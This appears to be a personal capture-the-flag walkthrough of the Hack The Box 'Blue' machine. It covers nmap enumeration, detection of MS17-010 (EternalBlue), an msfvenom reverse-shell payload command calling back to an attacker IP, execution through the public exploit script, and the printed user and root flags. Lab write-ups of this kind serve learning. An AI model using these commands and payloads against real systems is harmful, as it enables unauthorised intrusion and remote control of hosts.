# Enumerate

## Scan

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Blue$ scan 10.10.10.40
==================================
Found ports: 135,139,445,49152,49153,49154,49155,49156,49157
==================================
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 17:32 EDT
Nmap scan report for 10.10.10.40
Host is up (0.028s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -16m04s, deviation: 34m38s, median: 3m55s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-09T22:37:20+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-09T21:37:23
|_  start_date: 2020-06-09T21:35:23

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.15 seconds
```

## Enumerate Services

* smb-enum-shares? 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Blue$ nmap --script smb-enum-shares.nse -p445 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 17:36 EDT
Nmap scan report for 10.10.10.40
Host is up (0.026s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.40\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.40\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.10.40\Share: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.10.40\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 47.85 seconds
```

* Nothing helpful, vuln? 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Blue$ nmap --script vuln -p445 10.10.10.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 17:38 EDT
Nmap scan report for 10.10.10.40
Host is up (0.027s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 38.11 seconds
```

* Vulnerable to ms17-010 eternalblue

# Access

```
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | exploits/windows/remote/42315.py
```

* find that lsarpc seems to work as a named pipe. Had to (maybe?) add user and password, just set as guest and blank
  * Worked with both user and guest and blank passwords 
* https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
* [ ] Not sure a good way without metasploit to test which named pipes might be valid. 
* Saw this in a writeup: Not actually sure if the users it lists are valid users or why this is helpful? 

```
enum4linux -a 10.10.10.40 
```

* Created a local executable to upload and then have the script run. 

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.18 LPORT=4444 EXITFUNC=thread -f exe -o 101014184444.exe
```

* The script has a send_file function. Let's just use that to get the file over. 
  * Should have been able to get it to download the file, not sure why that didn't work. 
* Could also have used the run command as:

```
service_exec(conn, r'cmd /c c:\name.exe')
```

Should be able to have the command to download the file but not sure why that doesn't work. 

```
C:\Users>dir user.txt /s
dir user.txt /s
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\haris\Desktop

21/07/2017  07:54                32 user.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  15,609,221,120 bytes free

C:\Users>dir root.txt /s
dir root.txt /s
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users\Administrator\Desktop

21/07/2017  07:57                32 root.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  15,561,097,216 bytes free

C:\Users>type C:\Users\haris\Desktop\user.txt
type C:\Users\haris\Desktop\user.txt
4c546aea7dbee75cbd71de245c8deea9
C:\Users>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
ff548eb71e920ff6c08843ce9df4e717
```

